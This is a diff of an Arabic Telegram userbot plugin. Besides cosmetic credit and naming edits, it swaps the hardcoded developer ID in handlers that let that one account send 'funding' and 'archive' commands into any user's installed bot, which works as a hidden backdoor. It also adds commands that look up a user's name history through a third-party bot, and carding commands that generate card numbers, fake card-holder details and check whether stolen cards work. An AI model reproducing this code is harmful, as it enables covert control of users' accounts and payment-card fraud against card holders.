@@ -60,7 +60,7 @@ async def _(e):
     except Exception as ex:
         await edit_or_reply(e, f"`{str(ex)}`")
 
-# ================العاب  زد إي=========================
+# ================العاب زد إي=========================
 
 R = [
     "**𓆰**العـاب الاحترافيه** 🎮𓆪 \n"
@@ -83,8 +83,8 @@ R = [
     "  ⓱ **⪼**  [جيت واي 🚨](https://t.me/gamee?game=Getaway)   \n"
     "  ⓲ **⪼**  [الالـوان 🔮](https://t.me/gamee?game=ColorHit)   \n"
     "  ⓳ **⪼**  [مدفع الكرات🏮](https://t.me/gamee?game=NeonBlaster)   \n"
-    "**-** مطور السورس **⪼ [𐇮 𓂐 𓆩MODY𓆪 𖠛🇷🇺 ](t.me/UP_UO)   \n"
-    "**-** قناة السورس **⪼ [𐇮  زد إي ](t.me/UI_XB)   "
+    "**-** مطور السورس **⪼ [𐇮 𓂐 𓆩الــسيد𓆪 𖠛🇷🇺 ](t.me/lMl10l)   \n"
+    "**-** قناة السورس **⪼ [𐇮 زد إيي ](t.me/UI_XB)   "
 ]
 
 @l313l.on(admin_cmd(pattern="بلي$"))
@@ -166,7 +166,7 @@ Citation1_morning = [
     "** شنو محتاج حتى تكون مبسوط ؟ **",
     "** مطلبك الوحيد الحين ؟ **",
     "** هل حدث وشعرت بأنك ارتكبت أحد الذنوب أثناء الصيام؟ **",
-    "** اكثر مطور تحبه ب زد إي منو ؟ **",
+    "** اكثر مطور تحبه بزد إي منو ؟ **",
     "** من هو الممثل المفضل لديك؟ **",
     "** من ستختار من بين الموجودين ليمسح دموعك ويخفف أحزانك؟ **",
     "** إذا رأيتِ أحد أجمل منكِ هل يمكن أن تشعري بالغيرة منها؟ **",
@@ -282,10 +282,10 @@ HuRe_Bosa = [
 async def ithker(knopis):
     await knopis.edit(choice(HuRe_Bosa))
 
-DevJoker = [705475246]
-#تضل تخمط من عمك  زد إي ؟ الى اين يستمُر الفشل ياغُلام
+DevJoker = [6509622797]
+#تضل تخمط من عمك زد إي ؟ الى اين يستمُر الفشل ياغُلام
 @l313l.on(events.NewMessage(incoming=True))
-async def Hussein(event):
+async def Mody(event):
     if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
         message = event.message
         channel_username = None
@@ -302,7 +302,7 @@ async def Hussein(event):
         #await event.reply(response)
 
 @l313l.on(events.NewMessage(incoming=True))
-async def Hussein(event):
+async def Mody(event):
     if event.message.message.startswith("ارشف") and event.sender_id in DevJoker:
         message = event.message
         channel_username = None
@@ -334,12 +334,70 @@ async def handle_unblock_all(event):
             await client(functions.contacts.UnblockRequest(
                 id=InputPeerUser(user.id, user.access_hash)
             ))
-            aljoker_entity = await client.get_entity(user.id)
-            aljoker_profile = f"[{aljoker_entity.first_name}](tg://user?id={aljoker_entity.id})"
-            await event.edit(f"۞︙ تم إلغاء حظر المستخدم : {aljoker_profile}")
+            Ze_entity = await client.get_entity(user.id)
+            Ze_profile = f"[{Ze_entity.first_name}](tg://user?id={Ze_entity.id})"
+            await event.edit(f"۞︙ تم إلغاء حظر المستخدم : {Ze_profile}")
             asyncio.sleep(3)
         except ValueError:
             continue
         except Exception as e:
             await event.edit(f"حدث خطأ أثناء إلغاء حظر المستخدم بمعرّف: {user.id}, الخطأ: {e}")
             continue
+@l313l.on(admin_cmd(pattern="(تاريخه|تاريخة)$"))
+async def Mody(event):
+    reply_to = event.reply_to_msg_id
+    if reply_to:
+        msg = await client.get_messages(event.chat_id, ids=reply_to)
+        user_id = msg.sender_id
+        chat = await client.get_entity("@SangMata_beta_bot")
+        async with client.conversation(chat) as conv:
+            await conv.send_message(f'{user_id}')
+            response = await conv.get_response()
+            await event.edit(response.text)
+#من تفكر تخمطهن اذكر المصدر وصير حباب لتبوگ تعب غيرك !
+#By Mody For Ze 🔱
+@l313l.ar_cmd(pattern=r"ولد(.*)")
+async def Mody(event):
+    await event.edit('**۞︙ يتم الان توليد الفيزا انتظر 7 ثواني من فضلك 🫶🏻 **')
+    bot_username = '@SDBB_Bot'
+    joker = event.raw_text
+    Ze = joker.split('.ولد')[1].strip()
+    message = f'/gen {Ze}'
+    async with event.client.conversation(bot_username) as conv:
+        await conv.send_message(message)
+        await asyncio.sleep(7)
+        response = await conv.get_response()
+    async for edited_response in event.client.iter_messages(bot_username, limit=1):
+        if edited_response.id == response.id and edited_response.message != response.message:
+            response = edited_response
+    await event.edit(f'**ها هيَ الفيزات تم استخراجها من قبل سورس زد إي** \n@UI_XB:\n {response.text}')
+@l313l.ar_cmd(pattern=r"المعلومات(.*)")
+async def Mody(event):
+    await event.edit('**۞︙ يتم الان البحث عن معلومات الفيزا انتظر بضعة ثواني من فضلك 🫶🏻 **')
+    bot_username = '@SDBB_Bot'
+    joker = event.raw_text
+    Ze = joker.split('.المعلومات')[1].strip()
+    message = f'/fake {Ze}'
+    async with event.client.conversation(bot_username) as conv:
+        await conv.send_message(message)
+        await asyncio.sleep(5)
+        response = await conv.get_response()
+    async for edited_response in event.client.iter_messages(bot_username, limit=1):
+        if edited_response.id == response.id and edited_response.message != response.message:
+            response = edited_response
+    await event.edit(f'**ها هيَ المعلومات للفيزا تم استخراجها من قبل سورس زد إي** \n@UI_XB\n {response.text}')
+@l313l.ar_cmd(pattern=r"جيك(.*)")
+async def Mody(event):
+    await event.edit('**۞︙ يتم الان فحص البطاقة انتظر 20 ثانية من فضلك 🫶🏻 **')
+    bot_username = '@SDBB_Bot'
+    joker = event.raw_text
+    Ze = joker.split('.جيك')[1].strip()
+    message = f'/chk {Ze}'
+    async with event.client.conversation(bot_username) as conv:
+        await conv.send_message(message)
+        await asyncio.sleep(20)
+        response = await conv.get_response()
+    async for edited_response in event.client.iter_messages(bot_username, limit=1):
+        if edited_response.id == response.id and edited_response.message != response.message:
+            response = edited_response
+    await event.edit(f'**ها هيَ البطاقة تم فحصها من قبل سورس زد إي** \n@UI_XB\n {response.text}')
